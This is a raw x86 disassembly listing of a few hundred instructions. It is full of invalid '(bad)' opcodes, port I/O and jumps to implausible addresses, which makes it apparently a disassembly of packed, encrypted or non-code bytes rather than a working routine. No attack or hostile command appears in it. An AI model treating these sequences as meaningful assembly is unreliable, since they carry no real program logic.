  427e2b:	lahf   
  427e2c:	push   cs
  427e2d:	(bad)  
  427e2e:	retf   
  427e2f:	addr16 xchg ecx,eax
  427e31:	adc    bh,bl
  427e33:	add    DWORD PTR [eax],0x56fd66fe
  427e39:	sub    eax,0x81b7dcc5
  427e3e:	adc    BYTE PTR [edi],bh
  427e40:	jbe    0x427dee
  427e42:	sar    DWORD PTR [edi+0x40cf2524],cl
  427e48:	in     al,0xc9
  427e4a:	das    
  427e4b:	jne    0x427e8a
  427e4d:	jbe    0x427e8c
  427e4f:	rol    BYTE PTR es:[ebp+0xb5aaff],1
  427e56:	cmp    eax,0xc3e3556e
  427e5b:	into   
  427e5c:	jne    0x427e98
  427e5e:	ins    DWORD PTR es:[edi],dx
  427e5f:	cdq    
  427e60:	inc    ebx
  427e61:	les    ebp,FWORD PTR [edi+0x35]
  427e64:	dec    esi
  427e65:	data16 jne 0x427ed0
  427e68:	aam    0xa5
  427e6a:	or     al,0x3b
  427e6c:	dec    esi
  427e6d:	ja     0x427e1e
  427e6f:	fidivr DWORD PTR [ecx-0x24]
  427e72:	or     eax,0xf9e63a96
  427e77:	sbb    DWORD PTR [esi-0x39],esp
  427e7a:	aam    0x9
  427e7c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427e7d:	popa   
  427e7e:	xor    BYTE PTR [esi-0x707fe8cc],ah
  427e84:	lock rcl bh,1
  427e87:	xor    eax,0xc86e9961
  427e8c:	lea    ebx,[edx]
  427e8e:	dec    ecx
  427e8f:	pop    ebp
  427e90:	data16 cmp ch,bh
  427e93:	js     0x427e48
  427e95:	das    
  427e96:	div    BYTE PTR [edx-0x6d]
  427e99:	or     bh,bl
  427e9b:	retf   0xe6a5
  427e9e:	sahf   
  427e9f:	mov    al,ds:0xcc8b1fc8
  427ea4:	jo     0x427e50
  427ea6:	cmp    al,0xd5
  427ea8:	ret    0xf8a2
  427eab:	sbb    bh,BYTE PTR [ebp+0x5d]
  427eae:	ret    
  427eaf:	test   BYTE PTR [ebp+0x4c],ch
  427eb2:	je     0x427ee1
  427eb4:	ins    BYTE PTR es:[edi],dx
  427eb5:	xor    DWORD PTR [esi+ecx*8+0x7],ecx
  427eb9:	cwde   
  427eba:	mov    eax,ds:0x84bfd892
  427ebf:	or     ah,BYTE PTR [ecx-0x2c]
  427ec2:	mov    esi,0xc4e76fcd
  427ec7:	scas   al,BYTE PTR es:[edi]
  427ec8:	retf   0x471
  427ecb:	cmp    eax,0xedb978f1
  427ed0:	ret    
  427ed1:	sub    esp,DWORD PTR [ecx-0x7d0b7e25]
  427ed7:	push   cs
  427ed8:	cmp    DWORD PTR [edi+0x5888f587],esp
  427ede:	mov    ecx,0xf50807d8
  427ee3:	int3   
  427ee4:	mov    al,0x6f
  427ee6:	sahf   
  427ee7:	das    
  427ee8:	fwait
  427ee9:	cdq    
  427eea:	shl    ah,cl
  427eec:	dec    edx
  427eed:	ror    DWORD PTR [eax],0x27
  427ef0:	xor    BYTE PTR [eax],ah
  427ef2:	mov    ds:0x7e258566,eax
  427ef7:	(bad)  
  427ef8:	add    DWORD PTR [ebx+0x32937d5f],eax
  427efe:	add    BYTE PTR [edi+0x7f342b7a],bh
  427f04:	push   edx
  427f05:	mov    ecx,DWORD PTR [ebp-0x72]
  427f08:	pop    ebp
  427f09:	iret   
  427f0a:	cdq    
  427f0b:	clc    
  427f0c:	xor    eax,0x931a5519
  427f11:	jnp    0x427eb5
  427f13:	shl    BYTE PTR [edi+0x4d55a16d],1
  427f19:	pushf  
  427f1a:	jmp    DWORD PTR [ebx+esi*8]
  427f1d:	pop    esi
  427f1e:	mov    ch,0x60
  427f20:	or     BYTE PTR [ecx-0x4b],dl
  427f23:	data16 fsub DWORD PTR [esp+edi*2]
  427f27:	jmp    0x427f1b
  427f29:	inc    DWORD PTR [esi+0x4c63972d]
  427f2f:	push   ebp
  427f30:	lock daa 
  427f32:	clc    
  427f33:	imul   edi,edi,0x7e
  427f36:	cmp    ebx,DWORD PTR [eax]
  427f38:	je     0x427f7b
  427f3a:	xchg   esp,eax
  427f3b:	xor    al,0xff
  427f3d:	xchg   DWORD PTR [ebp+0x133cf48d],ecx
  427f43:	or     al,bh
  427f45:	jmp    0x4d80:0x6f297c91
  427f4c:	call   0xe7f90c66
  427f51:	xchg   ecx,eax
  427f52:	shr    ecx,1
  427f54:	and    dl,cl
  427f56:	fwait
	...
  427f5f:	add    BYTE PTR [eax],al
  427f61:	mov    ah,0x8b
  427f63:	(bad)
  427f66:	fbstp  TBYTE PTR [esi-0x1e57cf15]
  427f6c:	mov    ebx,0x5c57f38f
  427f71:	jg     0x427f68
  427f73:	add    DWORD PTR [eax],eax
  427f75:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427f76:	add    eax,DWORD PTR [eax]
  427f78:	add    bl,dh
  427f7a:	arpl   WORD PTR [eax+0x70c27817],ax
  427f80:	ins    BYTE PTR es:[edi],dx
  427f81:	scas   al,BYTE PTR es:[edi]
  427f82:	jl     0x427f1d
  427f84:	pmulhuw mm4,mm2
  427f87:	adc    al,0x7f
  427f89:	jecxz  0x427f90
  427f8b:	adc    eax,0x29390cd
  427f90:	setae  BYTE PTR [ecx+0x70d6476a]
  427f97:	dec    ecx
  427f98:	pop    ds
  427f99:	cmp    eax,0xcd8bc7bf
  427f9e:	xlat   BYTE PTR ds:[ebx]
  427f9f:	fisubr DWORD PTR [edx-0x107d457e]
  427fa5:	not    cl
  427fa7:	jmp    FWORD PTR [esi]
  427fa9:	leave  
  427faa:	inc    ebx
  427fab:	jo     0x427fce
  427fad:	xor    edx,edx
  427faf:	xchg   ebp,eax
  427fb0:	mov    bl,0x15
  427fb2:	pop    esi
  427fb3:	(bad)  
  427fb4:	push   edx
  427fb5:	and    DWORD PTR [esi+edx*8],edx
  427fb8:	and    al,0xc9
  427fba:	jno    0x428032
  427fbc:	xor    eax,0x1f71260e
  427fc1:	mov    bh,0x56
  427fc3:	mov    ebx,0x16ea73c0
  427fc8:	sbb    cl,0x73
  427fcb:	push   es
  427fcc:	jecxz  0x428036
  427fce:	sbb    ebp,DWORD PTR [ebx]
  427fd0:	pop    esi
  427fd1:	pop    ebp
  427fd2:	adc    eax,0x67078d8b
  427fd7:	in     al,dx
  427fd8:	push   esi
  427fd9:	dec    ebx
  427fda:	push   0x5be94c14
  427fdf:	xor    BYTE PTR [ebx+ebp*1+0x1],0x3e
  427fe4:	jecxz  0x427ff8
  427fe6:	push   edi
  427fe7:	mov    al,0xdc
  427fe9:	push   0xffffffa7
  427feb:	add    eax,0xaffb3392
  427ff0:	add    BYTE PTR [edx+0x27b72501],0x3
  427ff7:	jmp    0x92dda439
  427ffc:	or     cl,bl
  427ffe:	cdq    
  427fff:	sbb    al,0x17
  428001:	xor    ebx,DWORD PTR [esi+eax*1]
  428004:	test   bh,ah
  428006:	fcomp  DWORD PTR [esi+edx*2+0x119ebc42]
  42800d:	xlat   BYTE PTR ds:[ebx]
  42800e:	sub    al,0xee
  428010:	mov    ?,WORD PTR [ebp+0x63]
  428013:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428014:	jbe    0x42800d
  428016:	or     al,0x86
  428018:	(bad)  
  428019:	jb     0x428085
  42801b:	cdq    
  42801c:	inc    esi
  42801d:	xchg   DWORD PTR [eax],eax
  42801f:	cmp    cl,BYTE PTR [ebp-0x4ed086ab]
  428025:	(bad)  
  428026:	push   edi
  428027:	nop
  428028:	repz and BYTE PTR [edi-0x15c6c2ba],bl
  42802f:	lods   al,BYTE PTR ds:[esi]
  428030:	popf   
  428031:	test   edx,ebx
  428033:	enter  0x3ec2,0xb6
  428037:	in     eax,0xfc
  428039:	inc    esi
  42803a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42803b:	je     0x428047
  42803d:	cdq    
  42803e:	jl     0x427fdd
  428040:	(bad)  
  428041:	pop    ss
  428042:	ret    
  428043:	dec    eax
  428044:	bound  ebp,QWORD PTR [eax+edi*4+0x35a8e812]
  42804b:	mov    bl,0xdf
  42804d:	aas    
  42804e:	sbb    esi,DWORD PTR [ebp-0x77df7fc1]
  428054:	pusha  
  428055:	repnz or cl,BYTE PTR [edx+0x1e]
  428059:	aam    0x80
  42805b:	aaa    
  42805c:	pop    ecx
  42805d:	or     eax,0x37aa0c69
  428062:	(bad)  
  428063:	stc    
  428064:	ds pop edi
  428066:	jle    0x428049
  428068:	ins    BYTE PTR es:[edi],dx
  428069:	xchg   edi,eax
  42806a:	add    al,0x7b
  42806c:	mov    ebp,0x8e550e95
  428071:	xlat   BYTE PTR ds:[ebx]
  428072:	daa    
  428073:	adc    ch,BYTE PTR [edx-0x4e]
  428076:	scas   eax,DWORD PTR es:[edi]
  428077:	dec    ebx
  428078:	jae    0x428096
  42807a:	push   esi
  42807b:	inc    ecx
  42807c:	daa    
  42807d:	clc    
  42807e:	xchg   ebx,eax
  42807f:	aas    
  428080:	and    DWORD PTR [esi-0x73169bf6],esi
  428086:	int    0xc1
  428088:	out    dx,eax
  428089:	xchg   esi,eax
  42808a:	(bad)  
  42808c:	inc    esi
  42808d:	inc    ecx
  42808e:	sbb    al,0xe
  428090:	ins    BYTE PTR es:[edi],dx
  428091:	ins    BYTE PTR es:[edi],dx
  428092:	das    
  428093:	sbb    eax,0x157faa74
  428098:	mov    al,ds:0xf33f42cc
  42809d:	popa   
  42809e:	add    BYTE PTR ds:0xf366a3b1,dl
  4280a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4280a5:	xchg   esi,eax
  4280a6:	adc    eax,0xc73bac3
  4280ab:	jae    0x428098
  4280ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4280ae:	pop    eax
  4280af:	push   esp
  4280b0:	dec    ebx
  4280b1:	push   edx
  4280b2:	sub    al,0x9
  4280b4:	rcl    BYTE PTR [ecx+eiz*2],0x98
  4280b8:	mov    bh,0xf1
  4280ba:	push   0xffffffca
  4280bc:	xor    edi,DWORD PTR [esi-0x5690534e]
  4280c2:	dec    ecx
  4280c3:	loop   0x4280ce
  4280c5:	(bad)  
  4280c6:	loop   0x4280ff
  4280c8:	jecxz  0x42810a
  4280ca:	inc    ebp
  4280cb:	stos   DWORD PTR es:[edi],eax
  4280cc:	push   esi
  4280cd:	cwde   
  4280ce:	jno    0x4280e4
  4280d0:	enter  0xb75f,0xac
  4280d4:	inc    edi
  4280d5:	dec    eax
  4280d6:	pop    ds
  4280d7:	(bad)  
  4280d9:	pop    esp
  4280da:	scas   al,BYTE PTR es:[edi]
  4280db:	(bad)  
  4280dc:	jge    0x42810a
  4280de:	je     0x428123
  4280e0:	adc    DWORD PTR [ecx+0x3f9d7dbc],eax
  4280e6:	nop
  4280e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4280e8:	xor    edi,ebp
  4280ea:	scas   eax,DWORD PTR es:[edi]
  4280eb:	in     al,0xa3
  4280ed:	inc    esp
  4280ee:	push   ebp
  4280ef:	and    eax,DWORD PTR [edi+0x35263ff2]
  4280f5:	idiv   esp
  4280f7:	inc    ebx
  4280f8:	daa    
  4280f9:	mov    ebx,ebx
  4280fb:	sbb    ch,BYTE PTR [eax+0x62787e21]
  428101:	in     al,0xab
  428103:	mov    bh,0x53
  428105:	scas   eax,DWORD PTR es:[edi]
  428106:	lds    edi,FWORD PTR [ebx-0x33]
  428109:	xor    al,0x90
  42810b:	lods   al,BYTE PTR ss:[esi]
  42810d:	mov    al,ds:0xc5c583ad
  428112:	(bad)  
  428113:	clc    
  428114:	sbb    BYTE PTR [edx-0x572e1f3f],ah
  42811a:	int3   
  42811b:	xchg   esp,eax
  42811c:	mov    es,WORD PTR [ebx-0x2708900e]
  428122:	(bad)  
  428123:	shr    DWORD PTR [ecx+0x46],1
  428126:	or     DWORD PTR [ecx+ebp*8],ebx
  428129:	adc    al,0xd6
  42812b:	mov    dl,0x0
  42812d:	mov    bh,0x70
  42812f:	mov    ds:0xe529749b,eax
  428134:	aad    0x96
  428136:	xchg   ebp,eax
  428137:	jns    0x42815d
  428139:	inc    ebx
  42813a:	xor    eax,0x823ffb11
  42813f:	retf   
  428140:	mov    ecx,0xc0160cb1
  428145:	test   BYTE PTR ds:0x58d19705,al
  42814b:	ffree  st(0)
  42814d:	cmp    DWORD PTR [edi-0x4],edx
  428150:	repnz ins DWORD PTR es:[edi],dx
  428152:	mov    ?,esp
  428154:	mov    ch,0xe3
  428156:	pushf  
  428157:	dec    ecx
  428158:	and    BYTE PTR [edi-0x2],0xdd
  42815c:	stos   DWORD PTR es:[edi],eax
  42815d:	fimul  WORD PTR [edx-0x1f]
  428160:	add    BYTE PTR ds:[esi],0x6a
  428164:	push   es
  428165:	lahf   
  428166:	and    edi,DWORD PTR [ebp-0x19]
  428169:	ss test esp,esp
  42816c:	sub    DWORD PTR [ecx],esp
  42816e:	sar    edi,1
  428170:	push   edi
  428171:	mov    edx,0x55e5b90a
  428176:	fild   QWORD PTR ds:0x7d529891
  42817c:	pop    eax
  42817d:	scas   al,BYTE PTR es:[edi]
  42817e:	dec    ecx
  42817f:	fstp   QWORD PTR [ecx+0x77]
  428182:	addr16 push eax
  428184:	in     eax,0x17
  428186:	clc    
  428187:	push   ebp
  428188:	arpl   di,bp
  42818a:	xchg   edx,eax
  42818b:	jb     0x4281d1
  42818d:	dec    esi
  42818e:	sar    DWORD PTR [ebx+0x26c9b24],0xbc
  428195:	mov    cs,WORD PTR [eax+eiz*4]
  428198:	(bad)  
  428199:	fucomp st(7)
  42819b:	aad    0xfa
  42819d:	(bad)  
  42819e:	cwde   
  42819f:	outs   dx,BYTE PTR ds:[esi]
  4281a0:	jl     0x428176
  4281a2:	sbb    al,0x8e
  4281a4:	ret    0x70d
  4281a7:	inc    esi
  4281a8:	in     eax,0xd1
  4281aa:	(bad)  
  4281ab:	cld    
  4281ac:	fiadd  DWORD PTR [edx+ebp*4]
  4281af:	dec    esi
  4281b0:	inc    edi
  4281b1:	idiv   BYTE PTR [esi+0x15]
  4281b4:	out    0x47,al
  4281b6:	jns    0x42815f
  4281b8:	pop    ss
  4281b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4281ba:	cli    
  4281bb:	loop   0x4281d6
  4281bd:	mov    ds:0xfa9134e9,eax
  4281c2:	cmp    eax,0xbbb943e7
  4281c7:	sub    al,0x34
  4281c9:	inc    BYTE PTR [esi-0x6e]
  4281cc:	rcr    BYTE PTR [edi+0x50],0xe0
  4281d0:	sub    BYTE PTR [esi-0x3e],bl
  4281d3:	jno    0x428254
  4281d5:	pop    eax
  4281d6:	pop    ds
  4281d7:	dec    ebx
  4281d8:	sbb    ecx,0xffffff8e
  4281db:	sti    
  4281dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4281dd:	pushf  
  4281de:	cwde   
  4281df:	inc    eax
  4281e0:	ret    
  4281e1:	mov    esp,0x4fac537d
  4281e6:	test   al,0xdf
  4281e8:	neg    DWORD PTR [ebp+eiz*1+0xd]
  4281ec:	mov    ebx,0xece9754a
  4281f1:	data16 mov bl,0x15
  4281f4:	test   eax,0xd64030fa
  4281f9:	aaa    
  4281fa:	js     0x428279
  4281fc:	push   ebp
  4281fd:	icebp  
  4281fe:	jnp    0x428273
  428200:	ins    BYTE PTR es:[edi],dx
  428201:	xlat   BYTE PTR ds:[ebx]
  428202:	adc    al,0xd6
  428204:	(bad)  
  428206:	test   DWORD PTR [ebx],eax
  428208:	push   cs
  428209:	les    ebp,FWORD PTR [ebp+0x11]
  42820c:	add    DWORD PTR [edx],esi
  42820e:	repnz fsubrp st(1),st
  428211:	mov    al,ds:0x40d3a183
  428216:	stos   DWORD PTR es:[edi],eax
  428217:	hlt    
  428218:	iret   
  428219:	and    ebx,DWORD PTR [ebx]
  42821b:	imul   ecx,DWORD PTR [ecx-0x55c100ac],0x1c
  428222:	aas    
  428223:	ret    0xa305
  428226:	xchg   edx,eax
  428227:	pop    ss
  428228:	frndint 
  42822a:	cs test al,0x9d
  42822d:	sub    BYTE PTR [esi+esi*1],dl
  428230:	sbb    al,0x5f
  428232:	shl    BYTE PTR [eax+esi*4],1
  428235:	retf   
  428236:	imul   edi,DWORD PTR [edi-0x37407e93],0xffffffcd
  42823d:	sbb    al,0x65
  42823f:	mov    al,0xe0
  428241:	dec    edi
  428242:	imul   ebp,esi,0xffffff8c
  428245:	xor    BYTE PTR [ebx],bl
  428247:	pop    eax
  428248:	enter  0x50a5,0x55
  42824c:	in     al,dx
  42824d:	ds jge 0x428265
  428250:	xchg   ebp,eax
  428251:	or     eax,0x85384f24
  428256:	pop    ebx
  428257:	cmp    al,0x9f
  428259:	jb     0x42821b
  42825b:	sbb    DWORD PTR [esi-0x58b0ad9b],ebp
  428261:	mov    cl,0xa7
  428263:	(bad)  
  428264:	cmp    DWORD PTR [ebp+0x4c],esi
  428267:	sbb    DWORD PTR [ebx+0x37],0x8323c02f
  42826e:	ins    BYTE PTR es:[edi],dx
  42826f:	ror    BYTE PTR [edi+0x6a],0x14
  428273:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428274:	mov    ss:0x38eeb8a,eax
  42827a:	mov    edi,0x2ea5a79b
  42827f:	fadd   DWORD PTR [eax]
  428281:	ror    edi,cl
  428283:	xchg   ecx,eax
  428284:	dec    ebx
  428285:	ror    DWORD PTR [edx-0x7e],1
  428288:	data16 ja 0x4282c3
  42828b:	lds    esi,FWORD PTR [ecx+0x548a4936]
  428291:	xchg   esi,eax
  428292:	dec    esi
  428293:	mov    ebx,0x649c484d
  428298:	dec    ecx
  428299:	pop    edi
  42829a:	(bad)
  42829d:	push   cs
  42829e:	inc    ebp
  42829f:	cmp    DWORD PTR [ebp+0x2ea16437],edx
  4282a5:	fild   WORD PTR ds:0x2853d803
  4282ab:	mov    eax,ds:0xd204d13c
  4282b0:	aaa    
  4282b1:	aam    0x94
  4282b3:	mov    bl,BYTE PTR [ebx]
  4282b5:	je     0x42829e
  4282b7:	ds cs stos DWORD PTR es:[edi],eax
  4282ba:	dec    ebx
  4282bb:	adc    DWORD PTR [ebp+0x1],ecx
  4282be:	rol    ch,0x0
  4282c1:	es jg  0x4282be
  4282c4:	xchg   esi,eax
  4282c5:	mov    ecx,edi
  4282c7:	je     0x428273
  4282c9:	cmp    BYTE PTR [esi-0x29],0xd2
  4282cd:	retf   0x7ff7
  4282d0:	or     eax,0xe2346041
  4282d5:	cmc    
  4282d6:	jbe    0x428329
  4282d8:	repz cld 
  4282da:	pop    ebp
  4282db:	je     0x42832f
  4282dd:	icebp  
  4282de:	cli    
  4282df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4282e0:	and    ebp,ecx
  4282e2:	das    
  4282e3:	ins    DWORD PTR es:[edi],dx
  4282e4:	neg    BYTE PTR [esi+0x7e94b943]
  4282ea:	mov    ch,0x19
  4282ec:	dec    esp
  4282ed:	mov    ebp,0x1d66c9d6
  4282f2:	iret   
  4282f3:	ds adc eax,0xd813a3ee
  4282f9:	retf   
  4282fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4282fb:	jb     0x428312
  4282fd:	add    al,0x1
  4282ff:	mov    ds:0xc0af45d,eax
  428304:	das    
  428305:	push   ss
  428306:	rcl    cl,1
  428308:	add    BYTE PTR [ecx-0x2576b323],al
  42830e:	je     0x42831d
  428310:	fisttp DWORD PTR [edi-0x76]
  428313:	ds mov eax,0x2969b317
  428319:	sbb    eax,ebp
  42831b:	(bad)  
  42831c:	cmp    ch,BYTE PTR [ecx]
  42831e:	ins    DWORD PTR es:[edi],dx
  42831f:	push   es
	...
